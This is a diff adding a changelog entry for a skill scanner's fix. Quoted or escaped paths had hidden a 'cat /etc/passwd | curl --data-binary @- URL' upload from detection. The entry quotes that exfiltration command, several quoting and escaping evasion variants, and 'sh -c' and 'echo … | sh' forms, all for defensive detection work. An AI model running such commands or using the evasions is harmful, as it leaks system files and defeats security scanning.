@@ -262,6 +262,16 @@ per page instead. Gate: `test/impactdepthcheck.sh`.
 placeholder changes). Every ingest cache written by an earlier build is refused and re-indexed once, and every
 cached quality snapshot is recomputed. The session legend dictionary is `dictv=0e543e1e6a3fe37d entries=750`.
 
+### Fixed — `--scan-skill(s)`: quoting a sensitive path no longer hides its upload (sensitive-read-upload)
+
+`cat /etc/passwd | curl --data-binary @- URL` grades CRITICAL, but `cat "/etc/passwd" | curl …` scanned clean: an
+opening quote put the flow scan back in command position, so the reader's quoted file was read as a command and its
+read was never noted. A quote no longer re-arms command position inside a reader's segment (it still does elsewhere,
+so `sh -c "…"` and `echo "…" | sh` are read as code), and a shell word split by quotes or escapes (`/etc/"passwd"`,
+`@"/etc/passwd"`, `/etc/pass\wd`) is also read whole. Single-quoted, mixed, redirected and `head -c "N" FILE` forms are
+covered by `test/skillscan.sh`. Against the previous scanner no finding is lost on the skill fixtures, an adversarial
+set or this repository's own Markdown and scripts; two CRITICAL rows gain `why="sensitive-read-upload"`.
+
 ### Fixed — review round on train 22: false gates, a stack overflow, silent cuts
 
 - `--quality-delta` log-only handlers: a receiver is a logger only when the first or last word of its last segment is `log`, `logger` or `logging` (words split on `_`, `-` and camelCase), or a known logger package, not whenever it contains "log". A Python `except Exception: store.catalog.write(x)` no longer gates as log-only.
